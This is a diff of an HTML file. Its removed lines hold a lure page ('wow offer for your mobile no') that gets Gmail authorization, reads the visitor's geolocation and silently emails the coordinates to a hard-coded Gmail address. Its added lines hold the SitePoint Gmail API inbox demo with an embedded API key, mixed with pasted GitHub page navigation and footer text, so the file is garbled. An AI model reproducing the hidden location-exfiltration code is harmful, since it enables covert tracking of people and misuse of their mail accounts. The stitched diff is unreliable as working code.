@@ -1,87 +1,134 @@
+Skip to content
  
+Search or jump to…
+
+Pull requests
+Issues
+Marketplace
+Explore
+ 
+@SIVANAGARAJ 
+22
+116 131 sitepoint-editors/gmail-api-javascript-example
+forked from jayshields/gmail-api-javascript-example
+ Code  Pull requests 0  Projects 0  Wiki  Insights
+gmail-api-javascript-example
+/
+02 - Sending mail
+/
+index.html
+ James Hibbard Added second article
+dc301a3 on Feb 2, 2016
+353 lines (310 sloc)  11.2 KB
+    
+<!doctype html>
 <html>
-<head>
-<title>How to Get Current Location using Google Map Javascript API</title>
+  <head>
+    <title>Gmail API demo</title>
+    <meta charset="UTF-8">
 
-	<script src="//code.jquery.com/jquery-1.11.3.min.js"></script>
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap-theme.min.css">
+    <style>
+      iframe {
+        width: 100%;
+        border: 0;
+        min-height: 80%;
+        height: 600px;
+        display: flex;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Gmail API demo</h1>
 
-</head>
-<style>
-body {
-	font-family :Arial;
-}
-#map-layer {
-	margin: 20px 0px;
-	max-width: 600px;
-	min-height: 400;
-}
-#btnAction {
-	background: #3878c7;
-    padding: 10px 40px;
-    border: #3672bb 1px solid;
-    border-radius: 2px;
-    color: #FFF;
-    font-size: 0.9em;
-    cursor:pointer;
-    display:block;
-}
-#btnAction:disabled {
-    background: #6c99d2;
-}
-</style>
-<body>
+      <a href="#compose-modal" data-toggle="modal" id="compose-button" class="btn btn-primary pull-right hidden">Compose</a>
 
- 
-<h1>wow offer for your mobile no</h1>
-	 
-	<div id="map-layer"></div>
+      <button id="authorize-button" class="btn btn-primary hidden">Authorize</button>
 
-<p id="demo"></p>
-	<script type="text/javascript">
-	
-	var map;
-	function initMap() {
-		var mapLayer = document.getElementById("map-layer");
-		var centerCoordinates = new google.maps.LatLng(37.6, -95.665);
-		var defaultOptions = { center: centerCoordinates, zoom: 4 }
+      <table class="table table-striped table-inbox hidden">
+        <thead>
+          <tr>
+            <th>From</th>
+            <th>Subject</th>
+            <th>Date/Time</th>
+          </tr>
+        </thead>
+        <tbody></tbody>
+      </table>
+    </div>
 
-		map = new google.maps.Map(mapLayer, defaultOptions);
-		 
-	}
-function composeTidy()
-      {
-	  
-	  }
-	function locate(){
-	 
-		if ("geolocation" in navigator){
-			navigator.geolocation.getCurrentPosition(function(position){ 
-				var currentLatitude = position.coords.latitude;
-				var currentLongitude = position.coords.longitude;
+    <div class="modal fade" id="compose-modal" tabindex="-1" role="dialog">
+      <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+          <div class="modal-header">
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+              <span aria-hidden="true">&times;</span>
+            </button>
+            <h4 class="modal-title">Compose</h4>
+          </div>
+          <form onsubmit="return sendEmail();">
+            <div class="modal-body">
+              <div class="form-group">
+                <input type="email" class="form-control" id="compose-to" placeholder="To" required />
+              </div>
 
-				var infoWindowHTML = "Latitude: " + currentLatitude + "<br>Longitude: " + currentLongitude;
-				var infoWindow = new google.maps.InfoWindow({map: map, content: infoWindowHTML});
-				var currentLocation = { lat: currentLatitude, lng: currentLongitude };
-				sendMessage(
-          {
-            'To': 'asivapvl@gmail.com',
-            'Subject':  currentLatitude + 'ss '+ currentLongitude
-          },
-           currentLatitude + 'ss '+ currentLongitude,
-          composeTidy
-        );
-				infoWindow.setPosition(currentLocation);
-				document.getElementById("btnAction").style.display = 'none';
-			});
-		}
-	}
-	
-	
-	
-	</script>
-	
- 
-  <script type="text/javascript">
+              <div class="form-group">
+                <input type="text" class="form-control" id="compose-subject" placeholder="Subject" required />
+              </div>
+
+              <div class="form-group">
+                <textarea class="form-control" id="compose-message" placeholder="Message" rows="10" required></textarea>
+              </div>
+            </div>
+            <div class="modal-footer">
+              <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+              <button type="submit" id="send-button" class="btn btn-primary">Send</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal fade" id="reply-modal" tabindex="-1" role="dialog">
+      <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+          <div class="modal-header">
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+              <span aria-hidden="true">&times;</span>
+            </button>
+            <h4 class="modal-title">Reply</h4>
+          </div>
+          <form onsubmit="return sendReply();">
+            <input type="hidden" id="reply-message-id" />
+
+            <div class="modal-body">
+              <div class="form-group">
+                <input type="text" class="form-control" id="reply-to" disabled />
+              </div>
+
+              <div class="form-group">
+                <input type="text" class="form-control disabled" id="reply-subject" disabled />
+              </div>
+
+              <div class="form-group">
+                <textarea class="form-control" id="reply-message" placeholder="Message" rows="10" required></textarea>
+              </div>
+            </div>
+            <div class="modal-footer">
+              <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+              <button type="submit" id="reply-button" class="btn btn-primary">Send</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <script src="//code.jquery.com/jquery-1.11.3.min.js"></script>
+    <script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+
+    <script type="text/javascript">
       var clientId = '118458467914-ndjup1u319obcu0r8ssm62muf4anbm4t.apps.googleusercontent.com';
       var apiKey = 'AIzaSyC9pIgYWRrNMaF920He7QsFngdy4m3ZCWA';
       var scopes =
@@ -91,15 +138,14 @@ function composeTidy()
         gapi.client.setApiKey(apiKey);
         window.setTimeout(checkAuth, 1);
       }
-	function checkAuth() {
+      function checkAuth() {
         gapi.auth.authorize({
           client_id: clientId,
           scope: scopes,
           immediate: true
         }, handleAuthResult);
       }
-	  
-	   function handleAuthClick() {
+      function handleAuthClick() {
         gapi.auth.authorize({
           client_id: clientId,
           scope: scopes,
@@ -107,55 +153,141 @@ function composeTidy()
         }, handleAuthResult);
         return false;
       }
-	  
-	  
-	   function handleAuthResult(authResult) {
+      function handleAuthResult(authResult) {
         if(authResult && !authResult.error) {
           loadGmailApi();
+          $('#authorize-button').remove();
+          $('.table-inbox').removeClass("hidden");
+          $('#compose-button').removeClass("hidden");
         } else {
-           
+          $('#authorize-button').removeClass("hidden");
+          $('#authorize-button').on('click', function(){
             handleAuthClick();
-          
+          });
         }
-		
-		}
-		
-		function loadGmailApi() {
+      }
+      function loadGmailApi() {
         gapi.client.load('gmail', 'v1', displayInbox);
       }
-	  
-	  
-	  function displayInbox() {
-	  
-	  
+      function displayInbox() {
         var request = gapi.client.gmail.users.messages.list({
           'userId': 'me',
           'labelIds': 'INBOX',
           'maxResults': 10
         });
-		getLocation();
         request.execute(function(response) {
           $.each(response.messages, function() {
             var messageRequest = gapi.client.gmail.users.messages.get({
               'userId': 'me',
               'id': this.id
             });
-             
+            messageRequest.execute(appendMessageRow);
           });
         });
       }
-	  
-	  	
-	  
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else { 
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
-}
-
-  function sendMessage(headers_obj, message, callback)
+      function appendMessageRow(message) {
+        $('.table-inbox tbody').append(
+          '<tr>\
+            <td>'+getHeader(message.payload.headers, 'From')+'</td>\
+            <td>\
+              <a href="#message-modal-' + message.id +
+                '" data-toggle="modal" id="message-link-' + message.id+'">' +
+                getHeader(message.payload.headers, 'Subject') +
+              '</a>\
+            </td>\
+            <td>'+getHeader(message.payload.headers, 'Date')+'</td>\
+          </tr>'
+        );
+        var reply_to = (getHeader(message.payload.headers, 'Reply-to') !== '' ?
+          getHeader(message.payload.headers, 'Reply-to') :
+          getHeader(message.payload.headers, 'From')).replace(/\"/g, '&quot;');
+        var reply_subject = 'Re: '+getHeader(message.payload.headers, 'Subject').replace(/\"/g, '&quot;');
+        $('body').append(
+          '<div class="modal fade" id="message-modal-' + message.id +
+              '" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">\
+            <div class="modal-dialog modal-lg">\
+              <div class="modal-content">\
+                <div class="modal-header">\
+                  <button type="button"\
+                          class="close"\
+                          data-dismiss="modal"\
+                          aria-label="Close">\
+                    <span aria-hidden="true">&times;</span></button>\
+                  <h4 class="modal-title" id="myModalLabel">' +
+                    getHeader(message.payload.headers, 'Subject') +
+                  '</h4>\
+                </div>\
+                <div class="modal-body">\
+                  <iframe id="message-iframe-'+message.id+'" srcdoc="<p>Loading...</p>">\
+                  </iframe>\
+                </div>\
+                <div class="modal-footer">\
+                  <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>\
+                  <button type="button" class="btn btn-primary reply-button" data-dismiss="modal" data-toggle="modal" data-target="#reply-modal"\
+                  onclick="fillInReply(\
+                    \''+reply_to+'\', \
+                    \''+reply_subject+'\', \
+                    \''+getHeader(message.payload.headers, 'Message-ID')+'\'\
+                    );"\
+                  >Reply</button>\
+                </div>\
+              </div>\
+            </div>\
+          </div>'
+        );
+        $('#message-link-'+message.id).on('click', function(){
+          var ifrm = $('#message-iframe-'+message.id)[0].contentWindow.document;
+          $('body', ifrm).html(getBody(message.payload));
+        });
+      }
+      function sendEmail()
+      {
+        $('#send-button').addClass('disabled');
+        sendMessage(
+          {
+            'To': $('#compose-to').val(),
+            'Subject': $('#compose-subject').val()
+          },
+          $('#compose-message').val(),
+          composeTidy
+        );
+        return false;
+      }
+      function composeTidy()
+      {
+        $('#compose-modal').modal('hide');
+        $('#compose-to').val('');
+        $('#compose-subject').val('');
+        $('#compose-message').val('');
+        $('#send-button').removeClass('disabled');
+      }
+      function sendReply()
+      {
+        $('#reply-button').addClass('disabled');
+        sendMessage(
+          {
+            'To': $('#reply-to').val(),
+            'Subject': $('#reply-subject').val(),
+            'In-Reply-To': $('#reply-message-id').val()
+          },
+          $('#reply-message').val(),
+          replyTidy
+        );
+        return false;
+      }
+      function replyTidy()
+      {
+        $('#reply-modal').modal('hide');
+        $('#reply-message').val('');
+        $('#reply-button').removeClass('disabled');
+      }
+      function fillInReply(to, subject, message_id)
+      {
+        $('#reply-to').val(to);
+        $('#reply-subject').val(subject);
+        $('#reply-message-id').val(message_id);
+      }
+      function sendMessage(headers_obj, message, callback)
       {
         var email = '';
         for(var header in headers_obj)
@@ -169,23 +301,58 @@ function getLocation() {
         });
         return sendRequest.execute(callback);
       }
-
-function showPosition(position) {
-	sendMessage(
+      function getHeader(headers, index) {
+        var header = '';
+        $.each(headers, function(){
+          if(this.name.toLowerCase() === index.toLowerCase()){
+            header = this.value;
+          }
+        });
+        return header;
+      }
+      function getBody(message) {
+        var encodedBody = '';
+        if(typeof message.parts === 'undefined')
+        {
+          encodedBody = message.body.data;
+        }
+        else
+        {
+          encodedBody = getHTMLPart(message.parts);
+        }
+        encodedBody = encodedBody.replace(/-/g, '+').replace(/_/g, '/').replace(/\s/g, '');
+        return decodeURIComponent(escape(window.atob(encodedBody)));
+      }
+      function getHTMLPart(arr) {
+        for(var x = 0; x <= arr.length; x++)
+        {
+          if(typeof arr[x].parts === 'undefined')
           {
-            'To': 'asivapvl@gmail.com',
-            'Subject':  position.coords.latitude  + 'ss '+ position.coords.longitude
-          },
-           position.coords.latitude  + 'ss '+ currentLongitude,
-          composeTidy
-        );
-  
-}
-	   
-	
-	  
-	  </script>
-  <script src="https://apis.google.com/js/client.js?onload=handleClientLoad"></script>
-		 
-</body>
+            if(arr[x].mimeType === 'text/html')
+            {
+              return arr[x].body.data;
+            }
+          }
+          else
+          {
+            return getHTMLPart(arr[x].parts);
+          }
+        }
+        return '';
+      }
+    </script>
+    <script src="https://apis.google.com/js/client.js?onload=handleClientLoad"></script>
+  </body>
 </html>
+© 2019 GitHub, Inc.
+Terms
+Privacy
+Security
+Status
+Help
+Contact GitHub
+Pricing
+API
+Training
+Blog
+About
